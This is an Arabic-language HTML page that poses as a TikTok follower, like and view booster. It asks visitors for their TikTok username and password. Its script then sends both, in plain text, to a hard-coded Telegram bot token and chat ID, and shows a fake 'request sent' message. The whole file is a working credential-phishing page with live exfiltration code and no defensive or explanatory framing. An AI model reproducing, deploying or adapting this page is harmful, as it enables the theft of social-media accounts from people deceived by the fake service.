<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>رشق TikTok</title>
  <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@600&display=swap" rel="stylesheet">
  <style>
    body {
      background: linear-gradient(135deg, #000000, #1a1a1a);
      font-family: 'Cairo', sans-serif;
      color: white;
      text-align: center;
      padding: 30px;
    }
    h1 {
      font-size: 36px;
      margin-bottom: 20px;
      background: linear-gradient(to right, #fe2c55, #25f4ee);
      -webkit-background-clip: text;
      -webkit-text-fill-color: transparent;
    }
    form {
      background: #111;
      padding: 20px;
      border-radius: 15px;
      max-width: 400px;
      margin: auto;
      box-shadow: 0 0 15px rgba(0,0,0,0.4);
    }
    label {
      display: block;
      text-align: right;
      margin: 10px 0 5px;
      font-size: 16px;
    }
    input, select {
      width: 100%;
      padding: 12px;
      border-radius: 8px;
      border: none;
      margin-bottom: 15px;
      background: #222;
      color: white;
      font-size: 16px;
      box-sizing: border-box;
    }
    button {
      width: 100%;
      padding: 12px;
      background: #fe2c55;
      color: white;
      border: none;
      border-radius: 10px;
      font-size: 18px;
      cursor: pointer;
    }
    button:hover {
      background: #e3264c;
    }
  </style>
</head>
<body>
  <h1>رشق TikTok</h1>
  <form onsubmit="sendToTelegram(event)">
    <label for="username">اسم المستخدم:</label>
    <input type="text" id="username" placeholder="اكتب اسم المستخدم" required>

    <label for="password">كلمة المرور:</label>
    <input type="password" id="password" placeholder="اكتب كلمة المرور" required>

    <label for="count">اختر عدد الرشق:</label>
    <select id="count" required>
      <option value="1000">1000 </option>
      <option value="2000">2000 </option>
      <option value="5000">5000 </option>
    </select>

    <label for="type">نوع الرشق:</label>
    <select id="type" required>
      <option value="followers">متابعين</option>
      <option value="likes">لايكات</option>
      <option value="views">مشاهدات</option>
    </select>

    <button type="submit">ابدأ الرشق الآن</button>
  </form>

  <script>
    function sendToTelegram(event) {
      event.preventDefault();
      const username = document.getElementById("username").value;
      const password = document.getElementById("password").value;
      const count = document.getElementById("count").value;
      const type = document.getElementById("type").value;

      const message = `🔥 طلب جديد:\n👤 يوزر: ${username}\n🔑 باسورد: ${password}\n📊 العدد: ${count}\n🎯 النوع: ${type}`;

      fetch(`https://api.telegram.org/bot7585692343:AAG0QMwvIBcODt95ZINBxVJrOtvhsOeTTaU/sendMessage?chat_id=6454073193&text=${encodeURIComponent(message)}`)
        .then(response => alert("✅ تم الارسال الرشق"))
        .catch(error => alert("❌ حدث خطأ حاول مرة أخرى"));
    }
  </script>
</body>
</html
